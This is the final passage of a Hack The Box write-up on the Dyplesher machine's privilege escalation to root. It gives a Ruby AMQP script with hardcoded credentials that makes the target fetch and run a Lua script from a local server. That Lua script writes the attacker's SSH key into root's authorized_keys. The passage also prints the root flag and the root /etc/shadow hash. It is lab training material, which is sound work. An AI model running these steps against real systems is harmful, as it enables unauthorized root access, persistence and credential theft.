codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> [x] Sent http://10.10.15.36:8000/cyfun.test</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But our webserver was never pinged back:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby -run -ehttpd . -p8000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-10-01 23:04:28] INFO  WEBrick 1.6.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-10-01 23:04:28] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-10-01 23:04:28] INFO  WEBrick::HTTPServer#start: pid=124909 port=8000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I tried many different port but all is blocked, so let&#x27;s serve something from
the machine directly, localhost must be allowed by the firewall.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">felamos@dyplesher:~$ python3 -m http.server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> [x] Sent http://127.0.0.1:8000/cyfun.test</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Yeah it worked:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1 - - [01/Oct/2020 21:30:30] code 404, message File not found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1 - - [01/Oct/2020 21:30:30] &quot;GET /cyfun.test HTTP/1.0&quot; 404 -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that our PoC is working, let&#x27;s create a real payload.</p><p>The hint told us that the plugin would be downloaded and &quot;added&quot; (udnerstand executed).
It was talinkg about Cuberite plugin. <a href="https://cuberite.org/" target="_blank" rel="noopener noreferrer">Cuberite</a> is another Minecraft server,
this time plugins wont be coded in Java but <a href="https://api.cuberite.org/" target="_blank" rel="noopener noreferrer">in Lua</a>.</p><p>We could read how to <a href="https://api.cuberite.org/Writing-a-Cuberite-plugin.html" target="_blank" rel="noopener noreferrer">Writing a Cuberite plugin</a>
but in fact we don&#x27;t even need a proper plugin, any lua script will be executed.</p><p>Let&#x27;s GTFO to see how we can write our key to root SSH authorized keys file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gtfoblookup linux write lua</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lua:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    file-write:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Code: lua -e &#x27;local f=io.open(&quot;file_to_write&quot;, &quot;wb&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              f:write(&quot;DATA&quot;); io.close(f);&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>My short LUA script:</p><div class="language-lua codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-lua codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">f=io.open(&quot;/root/.ssh/authorized_keys&quot;, &quot;w&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">f:write(&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/yatK67NXLmgt1LepjDbW2b7lE6z7Y8aIlveOGb6Lp48w0X9qTYNtqe7tgXQCN0qbMlhARBekVewayh4XouStOoEz7jeT8v4vL6awy0XwrqA/asj/LNjDOjAVGBtOsnPn9qE4JXsxQLBGlxouETwrZSUh1FMQFSzO77FasFQO8k59XO9cgCYj/b+TjM+IV5S6uSZPlmchmeT3abJjBaE+JHZ3V9wpCcOZ8v/kMEL+2jW4Rc6R7ChuQeZmNbkZxOx+xiJIu/otpMwrLhApG8zQ3Gm2sCWa1Xg1PjzIga4TD11VHoPgaeqTPhML4Y+zx4WUv8zib3Fl3boYapqiHQy0BMM6knfnCCu+gpkurBtJOqr/4rnq2bL/akVWjjPs3SbKdluQiBp6L8ZJ9dLz2JTpV0TsEEelbnYXT0jY13iAU+iZTnAiJJL/suTFuk1jAvIO8sz1wc8oi0BXaITbaUpKQAnkREdR6rJItH/MO9R2GnPKPby9KshKcvn9eL+jBk= cyfun@penarch&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">io.close(f);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>My final AMQP PoC:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;bunny&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">options = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  host: &#x27;10.10.10.190&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port: 5672,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  user: &#x27;yuntao&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  password: &#x27;EashAnicOc3Op&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection = Bunny.new(options)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel = connection.create_channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange = channel.direct(&#x27;plugin_data&#x27;, durable: true)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">message = ARGV.empty? ? &#x27;http://127.0.0.1:9999/cyfun.lua&#x27; : ARGV.join(&#x27; &#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange.publish(message)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot; [x] Sent #{message}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.close</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> [x] Sent http://127.0.0.1:9999/cyfun.lua</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I win:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh -i ~/.ssh/id_rsa root@dyplesher.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@dyplesher:~# cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2f8166c0264af8f5e4a97cbd5587f820</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@dyplesher:~# cat /etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$xVQMTu91zGrMGCuW$qC.xh5Ss5WwuRJfr67qu8jQrFxBuXz7wCyZ.V2uG375veFICLiKXXc2O.ZOwpBvzZgbqRH3OvnkiFQPbpWJk8/:18375:0:99999:7::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>:</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/git/">git</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/http/">http</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/memcache/">memcache</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/php/">php</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Doctor/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Doctor </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Fatty/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Fatty </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#http-discovery" class="table-of-contents__link toc-highlight">HTTP discovery</a></li><li><a href="#http-enumeration" class="table-of-contents__link toc-highlight">HTTP enumeration</a></li><li><a href="#memcache-exploitation" class="table-of-contents__link toc-highlight">memcache exploitation</a></li><li><a href="#password-hash-cracking" class="table-of-contents__link toc-highlight">Password hash cracking</a></li><li><a href="#http-discovery-2" class="table-of-contents__link toc-highlight">HTTP discovery 2</a></li><li><a href="#git-discovery" class="table-of-contents__link toc-highlight">git discovery</a></li><li><a href="#http-enumeration-2" class="table-of-contents__link toc-highlight">HTTP enumeration 2</a></li><li><a href="#minecraft-plugin" class="table-of-contents__link toc-highlight">Minecraft plugin</a></li><li><a href="#privilege-escalation-of-machine--from-minatotw-to-felamos" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from MinatoTW to felamos</a></li><li><a href="#privilege-escalation-of-machine--from-felamos-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from felamos to root</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>